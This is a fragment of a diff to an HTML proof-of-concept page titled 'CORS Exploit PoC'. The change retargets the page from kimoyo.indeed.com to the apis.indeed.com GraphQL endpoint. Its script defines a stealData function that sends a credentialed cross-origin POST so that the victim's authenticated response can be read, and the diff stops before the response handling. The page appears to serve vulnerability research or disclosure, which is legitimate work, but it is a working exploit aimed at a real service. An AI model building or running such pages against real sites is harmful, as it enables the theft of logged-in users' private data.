@@ -2,18 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS Exploit PoC — kimoyo.indeed.com</title>
+  <title>CORS Exploit PoC — apis.indeed.com</title>
 </head>
 <body>
-  <h2>CORS Exploit PoC — kimoyo.indeed.com</h2>
+  <h2>CORS Exploit PoC — apis.indeed.com</h2>
   <button id="runBtn">Run PoC</button>
 
   <pre id="output">Waiting...</pre>
 
   <script>
     function stealData() {
-      fetch("https://kimoyo.indeed.com/line/encrypt", {
-        method: "GET",
+      fetch("https://apis.indeed.com/graphql", {
+        method: "POST",
         credentials: "include"
       })
       .then(response => {
